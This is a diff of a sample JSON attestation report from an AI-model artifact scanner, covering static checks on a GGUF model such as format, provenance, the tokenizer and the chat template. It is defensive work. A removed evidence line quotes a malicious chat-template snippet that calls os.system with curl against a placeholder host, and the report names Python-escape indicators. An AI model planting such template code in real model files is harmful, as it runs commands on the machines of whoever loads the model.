@@ -24,12 +24,12 @@
     "format": "GGUF",
     "size_bytes": 5123456789,
     "quant_declared": "Q5_K_M",
-    "quant_observed": "file_type 17",
+    "quant_observed": "Q5_K 71%, Q6_K 21%, Q8_0 8%, F32 <1% (tensor data by type)",
     "tokenizer_hash": "",
     "chat_template_hash": "7de1c58e208eda46"
   },
   "scope": {
-    "check_set_version": "tier1/0.1",
+    "check_set_version": "tier1/0.7",
     "tool_versions": "socair 0.1.0-dev",
     "execution_context": "Tier 1 static, portable",
     "input_path": "airlock pull",
@@ -39,9 +39,9 @@
   "checks": [
     {
       "name": "Format and structure",
-      "looks_for": "Malformed GGUF structure, unexpected tensors",
+      "looks_for": "Malformed container structure, unexpected tensors",
       "status": "PASS",
-      "notes": "GGUF v3 parsed: 291 tensors, 41 metadata pairs",
+      "notes": "GGUF v3: 291 tensors tile the data section exactly, each sized by its dims and type; 41 metadata pairs",
       "pass_means": "The container parsed, and its tensor data tiles the data section exactly: no unaccounted bytes, overlapping tensors, or duplicate names.",
       "maps_to": [
         {
@@ -57,43 +57,17 @@
       ]
     },
     {
-      "name": "Chat template (hero)",
-      "looks_for": "Code reach, hidden or obfuscated text, and override or content-triggered instructions in the chat template",
-      "status": "FAIL",
-      "evidence": "process-execution: {{ os.system('curl http://example.invalid/x') }} (template can invoke process execution)",
-      "notes": "1 structural code-execution indicator(s). Positive evidence.",
-      "pass_means": "The template parsed and reaches no Python internals or process execution, and carries no override or concealment language, URL, hidden or obfuscated text, or condition on message content. Instructions written as ordinary guidance are not detected.",
+      "name": "File inventory and payloads",
+      "looks_for": "Hidden files, embedded payloads, unexpected executables",
+      "status": "NOT_TESTED",
+      "notes": "artifact: 41 metadata keys, 2318 string bytes, 3 string-array elements (1 of 64+ bytes scanned), no payload indicator. Repo mirror not provided, so the repo file listing was not inspected.",
+      "pass_means": "No script, shell command, long encoded blob, or executable signature was found in string metadata values, including every string-array element of 64 bytes or more, and no native executable among the files. Shorter array elements, such as vocabulary tokens, are too short to carry one and are not scanned.",
       "maps_to": [
-        {
-          "framework": "MITRE ATLAS",
-          "id": "AML.T0051",
-          "name": "LLM Prompt Injection"
-        },
         {
           "framework": "MITRE ATLAS",
           "id": "AML.T0011.000",
           "name": "User Execution: Unsafe AI Artifacts"
         },
-        {
-          "framework": "OWASP LLM Top 10",
-          "id": "LLM01",
-          "name": "Prompt Injection"
-        },
-        {
-          "framework": "OWASP LLM Top 10",
-          "id": "LLM03",
-          "name": "Supply Chain"
-        }
-      ],
-      "severity": "critical"
-    },
-    {
-      "name": "Tokenizer config",
-      "looks_for": "Tokenizer metadata anomalies",
-      "status": "PASS",
-      "notes": "tokenizer family 'llama' is recognized",
-      "pass_means": "The tokenizer tables are internally consistent, and no control token carries instructions. When a canonical reference table for its family is configured (from a feed or SOCAIR_TOKENIZER_REFERENCE), every token was compared with it and no ordinary token differs; the notes say which reference, or that none was configured or matched.",
-      "maps_to": [
         {
           "framework": "MITRE ATLAS",
           "id": "AML.T0010.003",
@@ -107,16 +81,10 @@
       ]
     },
     {
-      "name": "Safetensors header and opcodes",
-      "looks_for": "Serialized code gadgets in headers or pickle opcodes",
-      "status": "NOT_TESTED",
-      "notes": "check not yet implemented"
-    },
-    {
       "name": "Hash, provenance, lineage",
       "looks_for": "Traceable origin: a manifest bound to this hash, from an immutable upstream commit",
       "status": "PASS",
-      "notes": "publisher unsigned; upstream commit resolved",
+      "notes": "origin bound to this artifact's hash, at an immutable commit: publisher example; repo https://huggingface.co/example/orion-7b-instruct; revision main; commit 71034c5d8bde858ff824298bdedc65515b97d2b9; via airlock pull; manifest records the upstream as unsigned; publisher signature not established",
       "pass_means": "A trusted publisher signature verified over this artifact, or an operator-supplied manifest binds this hash to a repository at an immutable commit. The notes say which; a manifest is the operator's claim, not a signature.",
       "maps_to": [
         {
@@ -140,7 +108,7 @@
       "name": "Known-bad hash match",
       "looks_for": "Match against the known-bad artifact denylist",
       "status": "PASS",
-      "notes": "no denylist entry matched",
+      "notes": "no entry matched among 1204 known-bad hashes (denylist /srv/socair/denylist.txt)",
       "pass_means": "This exact hash is not on the configured denylist. Any changed byte gives a new hash, so it catches only known files.",
       "maps_to": [
         {
@@ -161,10 +129,60 @@
       ]
     },
     {
+      "name": "Chat template (hero)",
+      "looks_for": "Code reach, hidden or obfuscated text, and override or content-triggered instructions in the chat template",
+      "status": "FAIL",
+      "evidence": "process-execution: .system(...) (template calls the process-execution function system); python-object-escape: __globals__ (template reaches a Python dunder attribute)",
+      "notes": "2 structural code-execution indicator(s). Positive evidence.",
+      "pass_means": "The template parsed and reaches no Python internals or process execution, and carries no override or concealment language, URL, hidden or obfuscated text, or condition on message content. Instructions written as ordinary guidance are not detected.",
+      "severity": "critical",
+      "maps_to": [
+        {
+          "framework": "MITRE ATLAS",
+          "id": "AML.T0051",
+          "name": "LLM Prompt Injection"
+        },
+        {
+          "framework": "MITRE ATLAS",
+          "id": "AML.T0011.000",
+          "name": "User Execution: Unsafe AI Artifacts"
+        },
+        {
+          "framework": "OWASP LLM Top 10",
+          "id": "LLM01",
+          "name": "Prompt Injection"
+        },
+        {
+          "framework": "OWASP LLM Top 10",
+          "id": "LLM03",
+          "name": "Supply Chain"
+        }
+      ]
+    },
+    {
+      "name": "Tokenizer config",
+      "looks_for": "Tampered tokenizer tables: special-token ids, token types, control tokens",
+      "status": "PASS",
+      "notes": "32000 tokens (sha256 9e0c1f2d3b4a5c6d), 3 control; token types, scores, and 3 special-token ids are consistent; no special token carries prose or instructions. No canonical tokenizer reference was configured, so its tokens were not compared.",
+      "pass_means": "The tokenizer tables are internally consistent, and no control token carries instructions. When a canonical reference table for its family is configured (from a feed or SOCAIR_TOKENIZER_REFERENCE), every token was compared with it and no ordinary token differs; the notes say which reference, or that none was configured or matched.",
+      "maps_to": [
+        {
+          "framework": "MITRE ATLAS",
+          "id": "AML.T0010.003",
+          "name": "AI Supply Chain Compromise: Model"
+        },
+        {
+          "framework": "OWASP LLM Top 10",
+          "id": "LLM03",
+          "name": "Supply Chain"
+        }
+      ]
+    },
+    {
       "name": "Quant match",
       "looks_for": "Declared quantization (file name) against the tensor types in the file",
       "status": "PASS",
-      "notes": "declared Q5_K_M matches observed file type 17",
+      "notes": "declared Q5_K_M: the tensors include Q5_K, as that quantization requires; tensors carry Q5_K 71%, Q6_K 21%, F32 <1%, Q8_0 8%",
       "pass_means": "At least one tensor has the base type the declared quantization requires. This checks labeling, not safety.",
       "maps_to": [
         {
@@ -178,36 +196,6 @@
           "name": "Supply Chain"
         }
       ]
-    },
-    {
-      "name": "Pickle opcode scan",
-      "looks_for": "Serialized code gadgets in pickle-based model files",
-      "status": "NOT_TESTED",
-      "notes": "artifact is GGUF, not a pickle format",
-      "pass_means": "Every import the pickle makes is on the reviewed safe list.",
-      "maps_to": [
-        {
-          "framework": "MITRE ATLAS",
-          "id": "AML.T0011.000",
-          "name": "User Execution: Unsafe AI Artifacts"
-        },
-        {
-          "framework": "MITRE ATLAS",
-          "id": "AML.T0010.003",
-          "name": "AI Supply Chain Compromise: Model"
-        },
-        {
-          "framework": "OWASP LLM Top 10",
-          "id": "LLM03",
-          "name": "Supply Chain"
-        }
-      ]
-    },
-    {
-      "name": "Forward-pass trigger probes (Tier 2)",
-      "looks_for": "Behavior under the production serving stack",
-      "status": "NOT_TESTED",
-      "notes": "Tier 2 not run"
     }
   ],
   "findings": {
@@ -215,18 +203,17 @@
       "Chat template (hero)"
     ],
     "not_tested": [
-      "Safetensors header and opcodes",
-      "Forward-pass trigger probes (Tier 2)"
+      "File inventory and payloads"
     ]
   },
   "assurance_level": {
     "awarded": "Tier 1 (static)",
     "definition": "Static checks on the artifact's bytes and metadata, run offline. No inference is run, and the weights are not evaluated for behavior.",
-    "does_mean": "Each listed check ran on the exact bytes identified by the artifact hash, and each row states what its PASS means. A FAIL carries positive evidence, a LEAD needs escalated review, and a NOT_TESTED names why it was not tested.",
+    "does_mean": "Each listed check ran on the exact bytes identified by the artifact hash, and each row states what its PASS means. A FAIL carries positive evidence, a LEAD is a suspicious signal that needs a person's review, and a NOT_TESTED names why it was not tested. A FAIL or a LEAD withholds promotion, and no acceptance clears it.",
     "does_not_mean": "It is not an assessment of the model's behavior or safety. It does not test the weights for backdoors or poisoning, behavior that appears only after quantization or on particular hardware, or jailbreak susceptibility and harmful capability, and it does not check licensing.",
     "tier2_note": "Tier 2 (inference on the production node class) did not run."
   },
-  "bounded_statement": "For the artifact identified by hash in Section 2, served on the node class named in Section 3, the checks listed in Section 4 found no indicators within their stated scope. Every surface outside that scope is enumerated as NOT_TESTED in Section 8.",
+  "bounded_statement": "For the artifact identified by its hash, the Tier 1 checks found the indicators this report lists: each FAIL is positive evidence, and each LEAD is a suspicious signal that needs review. Rows marked NOT_TESTED were not examined, for the reason each row gives. Tier 1 runs no inference, so no model behavior was tested. Every surface outside that scope is listed under Out of scope.",
   "out_of_scope": {
     "does_not_certify": "This attestation does not certify the absence of unknown backdoors.",
     "ceiling": [
@@ -240,32 +227,38 @@
       "Chat-template instructions written as ordinary guidance (no override or concealment phrase, URL, hidden or obfuscated text, or condition on message content), unless the template matches a reviewed template.",
       "License and usage-policy compliance."
     ],
-    "unparsed_formats": [],
     "untested_node_classes": [
-      "cuda-sm90",
-      "apple-m3"
+      "every node class: Tier 1 is static and ran no inference on any hardware"
+    ],
+    "not_run": [
+      {
+        "name": "Forward-pass trigger probes (Tier 2)",
+        "looks_for": "Behavior under the production serving stack",
+        "reason": "Tier 2 (forward-pass, on the production node class) did not run; Tier 1 is static and runs no inference"
+      },
+      {
+        "name": "Serving-stack differential (Tier 2)",
+        "looks_for": "Same artifact behaving differently across stacks",
+        "reason": "Tier 2 (forward-pass, on the production node class) did not run; Tier 1 is static and runs no inference"
+      }
     ]
   },
   "promotion_authorization": {
     "authorized": false,
     "state": "withheld",
     "level": "Tier 1 only",
-    "conditions": "Withheld: the hero check FAILED and two checks are NOT_TESTED. Submit for escalated review.",
-    "accepted_surfaces": [
-      "Safetensors header and opcodes",
-      "Forward-pass trigger probes (Tier 2)"
-    ]
+    "conditions": "Withheld: positive evidence on Chat template (hero). A FAIL or a LEAD withholds promotion, and no acceptance clears it: it needs a person's review outside Socair."
   },
   "verification": {
     "document_hash": "",
-    "signing_method": "unsigned (OSS tier)",
+    "signing_method": "sample: not signed",
     "signer_key_id": "SAMPLE-KEY-0001",
     "artifact_sha256": "0000000000000000000000000000000000000000000000000000000000000000",
-    "rerun_instructions": "socair render <path>"
+    "rerun_instructions": "socair scan <path>"
   },
   "issuer": {
-    "signed_by": "Sample Signer",
-    "authority": "Defilan Technologies (sample)",
+    "signed_by": "Example Security Team (sample)",
+    "authority": "Example Security Team (sample)",
     "warrants": "Sample only.",
     "excludes": "No absence guarantee. See the bounded statement and out-of-scope ceiling."
   },
